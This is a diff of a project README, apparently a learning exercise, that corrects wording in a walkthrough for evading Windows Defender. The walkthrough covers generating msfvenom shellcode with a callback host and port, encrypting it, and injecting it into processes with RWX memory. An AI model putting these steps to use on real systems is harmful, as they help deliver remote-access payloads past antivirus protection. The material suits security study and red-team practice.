@@ -11,8 +11,8 @@ That's why i learned reverse engineering, because you need to be able to underst
 that's what make the difference between people in this field!
 
 I guess you already know which one I chose to start with, i chose the latter.
-Here's the blog I used as a reference : https://medium.com/@s12deff/bypass-windows-defender-executing-shellcode-using-freeloaderinjector-7deeba8796e2
-In that blog he use the undocumented API : `ntdll.dll`. I didn't want to just copy and paste it, so i adapted is code to use it with the documented API
+Here's the blog I used as a reference : https://medium.com/@s12deff/bypass-windows-defender-executing-shellcode-using-freeloaderinjector-7deeba8796e2.
+In that blog he used the undocumented API : `ntdll.dll`. I didn't want to just copy and paste it, so i adapted it by using the documented API
 and I removed unnecessary stuff, which provided me a good practice and refresher.
 
 
@@ -29,9 +29,9 @@ and I removed unnecessary stuff, which provided me a good practice and refresher
 ### Walkthrough
 
 1. So first, I started by generating a shellcode with msfvenom : `msfvenom -p <PAYLOAD> LHOST=<YOUR_IP> LPORT=<PORT> -f c > <NAME>.c`
-2. Encrypt the payloadm I have an encryptor program that i used, you can find it on my Github (you can create your own too) : `Crypter`
+2. Then I Encrypted the payload, I have an encryptor program that i used, you can find it on my Github (you can create your own too) : `Crypter`
 3. The main program will
-    - Get an handle on each processes and duplicate them (for future implementations i duplicate them, to be able to perform additionnal executions)
+    - Get an handle on each processes and duplicate them (for future implementations i duplicate them, to be able to perform additionnal executions and also to be able to immediately close the handle i opened)
     - Check if the process has RWX memory section and get that address in memory
     - Decrypt the payload and inject it into that section
 4. Build the executable as Release and upload it to your windows vm
